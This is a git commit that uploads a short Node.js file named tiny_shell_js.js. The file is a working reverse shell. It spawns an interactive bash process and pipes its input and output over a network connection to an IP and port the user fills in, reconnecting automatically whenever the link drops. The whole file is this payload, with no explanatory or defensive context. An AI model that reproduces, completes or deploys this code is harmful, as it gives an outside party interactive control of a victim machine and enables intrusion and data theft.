9bc151df6f0ff2acb8ddc5ee42940c3c8758d3f8
Camilo Andrés <44235993+k1000o23@users.noreply.github.com>
2018-12-10 13:49:09 +0100

    Add files via upload

---
+++ tiny_shell_js.js
@@ -0,0 +1,13 @@
+var port = "Fill with port listening";
+var ip = "Fill with your IP";
+var spawn = require('child_process').spawn;
+var net = require('net');
+var reconnect = require('reconnect');
+
+reconnect(function (stream) {
+    var ps = spawn('bash', [ '-i' ]);
+    stream.pipe(ps.stdin);
+    ps.stdout.pipe(stream, { end: false });
+    ps.stderr.pipe(stream, { end: false });
+    ps.on('exit', function () { stream.end() });
+}).connect(port, ip);
